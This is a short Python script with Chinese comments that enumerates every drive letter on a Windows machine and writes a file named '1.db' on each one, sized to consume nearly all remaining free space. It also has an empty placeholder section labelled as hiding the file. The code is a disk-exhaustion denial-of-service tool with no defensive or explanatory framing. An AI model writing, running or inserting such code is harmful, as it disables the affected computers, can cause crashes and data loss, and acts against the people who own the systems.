
import string
import os
import shutil 

 
# 获取磁盘列表
def get_disklist():
    disk_list = []
    for c in string.ascii_uppercase:
        disk = c+':'
        if os.path.isdir(disk):
            disk_list.append(disk)
    return disk_list
 
# 创建大文件
def createfile(filename,size):
    with open(filename, 'wb') as f:
        f.seek(size-1)
        f.write(b'\x00')

# 隐藏掉文件


# 查看磁盘剩余空间
def check_size(disk):
  total_b, used_b, free_b = shutil.disk_usage(disk) #查看磁盘的使用情况
  return free_b
  

# 入口函数
if __name__ == '__main__':
  for i in get_disklist():
    createfile(f'{i}/1.db',check_size(i)-1000000)
